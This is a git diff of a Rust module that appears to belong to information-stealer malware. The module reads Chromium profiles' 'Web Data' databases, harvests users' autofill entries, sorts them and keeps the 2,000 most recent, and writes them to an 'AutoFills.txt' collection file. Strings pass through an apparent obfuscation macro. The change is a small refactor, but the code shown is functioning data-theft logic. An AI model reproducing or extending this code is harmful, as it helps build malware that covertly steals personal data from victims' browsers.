@@ -2,6 +2,7 @@ use crate::alloc::borrow::ToOwned;
 use crate::chromium::BrowserData;
 use crate::{AutoFill, SqliteDatabase, read_and_collect_unique_records, to_string_and_write_all};
 use alloc::sync::Arc;
+use derive_new::new;
 use collector::{Browser, Collector};
 use database::TableRecord;
 use filesystem::FileSystem;
@@ -14,21 +15,16 @@ const AUTOFILL_NAME: usize = 0;
 const AUTOFILL_VALUE: usize = 1;
 const AUTOFILL_DATE_LAST_USED: usize = 4;
 
+#[derive(new)]
 pub(super) struct AutoFillTask {
     browser: Arc<BrowserData>,
-}
-
-impl AutoFillTask {
-    pub(super) fn new(browser: Arc<BrowserData>) -> Self {
-        Self { browser }
-    }
 }
 
 impl<C: Collector, F: FileSystem> Task<C, F> for AutoFillTask {
     parent_name!("AutoFills.txt");
 
     fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
-        let Some(mut autofills) = read_and_collect_unique_records::<SqliteDatabase, _, _>(
+        let Some(mut auto_fills) = read_and_collect_unique_records::<SqliteDatabase, _, _>(
             &self.browser.profiles,
             &StorageFileSystem,
             |profile| profile / s!("Web Data"),
@@ -38,14 +34,14 @@ impl<C: Collector, F: FileSystem> Task<C, F> for AutoFillTask {
             return;
         };
 
-        autofills.sort_by(|a, b| b.last_used.cmp(&a.last_used));
-        autofills.truncate(2000);
+        auto_fills.sort_by(|a, b| b.last_used.cmp(&a.last_used));
+        auto_fills.truncate(2000);
 
         collector
             .get_browser()
-            .increase_auto_fills_by(autofills.len());
+            .increase_auto_fills_by(auto_fills.len());
 
-        let _ = to_string_and_write_all(&autofills, "\n\n", filesystem, parent);
+        let _ = to_string_and_write_all(&auto_fills, "\n\n", filesystem, parent);
     }
 }
 
